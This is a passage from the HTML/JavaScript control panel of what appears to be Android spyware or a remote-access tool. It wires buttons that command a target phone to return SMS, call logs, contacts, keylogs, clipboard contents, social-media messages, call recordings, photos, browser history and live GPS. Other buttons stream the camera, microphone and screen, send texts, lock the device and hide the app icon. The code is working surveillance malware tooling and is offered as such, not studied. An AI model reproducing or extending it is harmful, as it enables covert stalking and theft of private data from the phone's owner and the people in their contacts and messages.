                flashOn = true; 
                document.getElementById('flashBtn').innerText = 'Flash Off'; 
                showNotification('Flash ON'); 
            }
            else if (msg.startsWith("FLASH_OFF")) { 
                flashOn = false; 
                document.getElementById('flashBtn').innerText = 'Flash On'; 
                showNotification('Flash OFF'); 
            }
            else if (msg.startsWith("LOC_DATA:")) try { renderMap(JSON.parse(msg.substring(9))); } catch (e) { }
            else if (msg.startsWith("SMS_DATA:")) try { displaySMS(JSON.parse(msg.substring(9))); } catch (e) { }
            else if (msg.startsWith("CALL_DATA:")) try { displayCallLogs(JSON.parse(msg.substring(10))); } catch (e) { }
            else if (msg.startsWith("CONTACTS_DATA:")) try { displayContacts(JSON.parse(msg.substring(14))); } catch (e) { }
            else if (msg.startsWith("WIFI_DATA:")) try { displayWifiNetworks(JSON.parse(msg.substring(10))); } catch (e) { }
            else if (msg.startsWith('[') || msg.startsWith('{')) try { handleJSON(JSON.parse(msg)); } catch (e) { }
        }

        function handleIncomingMessage(msg) {
            try {
                const j = JSON.parse(msg);
                if (j.type === 'SIGNALING') handleSignaling(j.data);
                else handleJSON(j);
            } catch (e) {
                handlePlainText(msg);
            }
        }

        // ==================== EVENT LISTENERS ====================
        function setupEvents() {
            document.getElementById('overviewBtn').onclick = renderDeviceOverview;
            document.getElementById('screenShareBtn').onclick = toggleScreen;
            document.getElementById('clickPictureBtn').onclick = () => {
                document.getElementById('liveCameraPanel').classList.remove('show');
                document.getElementById('clickCameraPanel').classList.toggle('show');
                toggleFlashOptions();
            };
            document.getElementById('capturePictureBtn').onclick = capturePicture;
            document.getElementById('liveCameraBtn').onclick = () => {
                document.getElementById('clickCameraPanel').classList.remove('show');
                document.getElementById('liveCameraPanel').classList.toggle('show');
                toggleFlashOptions();
            };
            document.getElementById('startLiveStreamBtn').onclick = startLiveCamera;
            document.getElementById('liveAudioBtn').onclick = startLiveAudio;
            document.getElementById('stopLiveAudioBtn').onclick = stopLiveAudio;
            document.getElementById('fileManagerBtn').onclick = () => { stopActiveModules(); refreshFileRoot(); };
            document.getElementById('smsBtn').onclick = () => { stopActiveModules(); currentPage = 0; sendCommand('GET_SMS', { box: '' }); };
            document.getElementById('callLogsBtn').onclick = () => { stopActiveModules(); currentPage = 0; sendCommand('GET_CALL_LOGS'); };
            document.getElementById('contactsBtn').onclick = () => { stopActiveModules(); currentPage = 0; sendCommand('GET_CONTACTS'); };
            document.getElementById('installedAppsBtn').onclick = () => { stopActiveModules(); currentPage = 0; sendCommand('GET_INSTALLED_APPS'); };
            document.getElementById('browserHistoryBtn').onclick = () => { stopActiveModules(); sendCommand('GET_BROWSER_HISTORY'); };
            document.getElementById('wifiNetworksBtn').onclick = () => { stopActiveModules(); currentPage = 0; sendCommand('GET_WIFI_NETWORKS'); };
            document.getElementById('screenTimeBtn').onclick = () => { stopActiveModules(); showAppUsagePanel(); };
            document.getElementById('socialMessagesBtn').onclick = () => { stopActiveModules(); sendCommand('GET_SOCIAL_MESSAGES', { days: 3 }); };
            document.getElementById('keylogBtn').onclick = () => { stopActiveModules(); sendCommand('GET_KEYLOG'); };
            document.getElementById('clipboardBtn').onclick = () => { stopActiveModules(); sendCommand('GET_CLIPBOARD'); };
            document.getElementById('geofenceBtn').onclick = () => { stopActiveModules(); showGeofencePanel(); };
            document.getElementById('autoCaptureBtn').onclick = () => { stopActiveModules(); showSchedulePanel(); };
            document.getElementById('liveGpsBtn').onclick = toggleLiveGps;
            document.getElementById('locationHistoryBtn').onclick = () => { stopActiveModules(); showLocationHistoryPanel(); };
            document.getElementById('callRecordingsBtn').onclick = () => { stopActiveModules(); showCallRecordingsPanel(); };
            document.getElementById('photoGalleryBtn').onclick = () => { stopActiveModules(); showPhotoGalleryPanel(); };
            document.getElementById('appEventsBtn').onclick = () => { stopActiveModules(); showAppEventsPanel(); };
            document.getElementById('smsKeywordsBtn').onclick = () => { stopActiveModules(); showSmsKeywordsPanel(); };
            document.getElementById('toggleAppIconBtn').onclick = toggleAppIcon;
            document.getElementById('lockDeviceBtn').onclick = () => sendCommand('LOCK_DEVICE');
            document.getElementById('sendSmsBtn').onclick = showSendSmsPanel;
            document.getElementById('vibrateBtn').onclick = () => sendCommand('VIBRATE', { duration: 1000 });
            document.getElementById('toggleFlashBtn').onclick = toggleFlash;
            document.getElementById('reconnectBtn').onclick = manualReconnect;
            document.getElementById('clearAlertsBtn').onclick = clearAlerts;
            document.getElementById('logoutBtn').onclick = logout;
        }

        // ==================== INITIALIZE AUTH STATE ====================
        auth.onAuthStateChanged(user => {
            console.log("Auth state changed:", user ? user.email : "none");
            currentUser = user;
            if (user) {
                document.getElementById('authContainer').style.display = 'none';
                loadDevices();
            } else {
                document.getElementById('authContainer').style.display = 'flex';
                document.getElementById('deviceListContainer').style.display = 'none';
                document.getElementById('sidebar').style.display = 'none';
                document.getElementById('main').style.display = 'none';
                isLoginMode = true;
                renderAuthForm();
            }
        });

        renderAuthForm();
        setupEvents();
    </script>
</body>
